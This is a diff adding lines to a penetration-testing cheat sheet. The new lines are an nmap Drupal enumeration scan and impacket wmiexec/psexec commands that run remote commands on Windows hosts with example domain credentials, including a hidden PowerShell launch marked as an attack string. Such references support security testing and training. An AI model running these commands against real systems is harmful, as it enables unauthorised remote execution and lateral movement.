@@ -54,6 +54,7 @@ cat script.db | grep intrusive  # Find out which nmap scripts are considered int
 nmap -n -sC --script=sshv1.nse 10.10.10.0/24 -p 22  # Check for SSHv1
 nmap -n -sC --script=nbtstat.nse 10.10.10.0/24  # Looks for Netbios traffic 
 nmap -sV --script ssl-enum-ciphers -p 443 10.10.10.10
+nmap Pn -p 80 --script http-drupal-enum www.target.com  # Drupal enumeration script
 
 # NetCat
 nc -l 8888  # Listen for connections on this port (Or -L on Windows), 
@@ -184,6 +185,12 @@ mount -v -o offset=123456 -t ext4 ctf-image.img mountpoint/
 
 nfspysh -o server=192.168.1.2:/
 showmount -e 192.168.1.2    
+
+git clone https://github.com/CoreSecurity/impacket
+cd impacket/
+python examples/wmiexec.py 192.168.1.1 DOMAIN/user:P@ssw0rd
+python examples/psexec.py -target-ip 192.168.1.2 DOMAIN/user:P@ssw0rd net use
+python examples/psexec.py -target-ip 192.168.1.2 DOMAIN/user:P@ssw0rd "powershell.exe -w hidden" # Rest of attack string goes here
 
 
 
